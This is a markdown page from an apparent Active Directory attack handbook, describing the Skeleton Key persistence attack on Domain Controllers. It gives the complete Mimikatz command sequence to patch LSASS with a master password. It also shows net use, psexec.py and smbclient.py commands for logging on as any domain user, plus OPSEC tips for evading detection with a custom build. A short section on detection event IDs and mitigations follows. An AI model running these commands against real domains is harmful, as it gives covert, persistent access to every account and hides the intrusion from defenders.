---
title: "Attack #61 — Skeleton Key Attack"
description: "The Skeleton Key attack patches the LSASS process on a Domain Controller to add a master password (\"skeleton key\") that works alongside every user's real…"
category: active-directory
subcategory: "Persistence"
tags: ["active-directory", "privilege-escalation"]
tools: ["Mimikatz", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Eight/🟤 Attack #61 — Skeleton Key Attack.md"
---
# 🟤 Attack #61 — Skeleton Key Attack

***

## 📖 How It Works

The Skeleton Key attack patches the **LSASS process on a Domain Controller** to add a master password ("skeleton key") that works alongside every user's real password. After patching, the attacker can authenticate as **any domain user** using the skeleton key password (default: `mimikatz`) while the user's original password continues to work normally — making it invisible.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Domain Admin / SYSTEM on DC** | Required to patch LSASS |
| **Physical/remote access to DC** | Must run Mimikatz on the DC itself |

***

## 💻 Full Commands

```powershell
# ── Inject Skeleton Key into LSASS ───────────────────────────────────────────
mimikatz.exe
privilege::debug
misc::skeleton
# [KDC] Skeleton Key implanted
# Default skeleton key password: "mimikatz"

# ── Now authenticate as ANY user with skeleton key ────────────────────────────
net use \\TARGET\C$ /user:corp\Administrator mimikatz
# Also works: runas /user:corp\any_user /netonly cmd.exe (password: mimikatz)
# Original user password ALSO still works — no disruption
```

```bash
# ── Linux — authenticate with skeleton key ────────────────────────────────────
psexec.py corp.local/Administrator:'mimikatz'@DC01.corp.local
smbclient.py corp.local/any_user:'mimikatz'@DC01.corp.local
```

***

## 🎯 OPSEC Tips

- **In-memory only** — doesn't survive DC reboot; must re-inject after restart
- **Only affects the patched DC** — if multiple DCs exist, must patch each one
- **LSASS patching may crash** — risky on production DCs
- **Default password is `mimikatz`** — change via custom Mimikatz build for stealth

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **7036** | System Log | LSASS crash or restart (if patching fails) |
| **Sysmon 10** | Sysmon | Process access — writing to LSASS memory |
| **4624** | Security Log | Successful logon with RC4 encryption (Skeleton Key forces RC4 downgrade) |

**Primary detection:** Skeleton Key forces RC4 (etype 23) for Kerberos authentication. In environments enforcing AES-only, any AS-REQ/TGT using RC4 encryption type is highly suspicious.

***

## 🔗 Attack Chain Context

```
[Skeleton Key] ──→ Master Password for All Domain Accounts
         │
         ├──→ 🔑 Every user has two passwords: their real one + "mimikatz"
         ├──→ ⚠️ In-memory only — doesn't survive reboot
         ├──→ 🔗 Must have DA to deploy; used for persistence
         └──→ 💀 Defeated by: enforce AES, run Protected Process Light, monitor LSASS access
```

***

> ✅ **Attack #61 — Skeleton Key complete.**
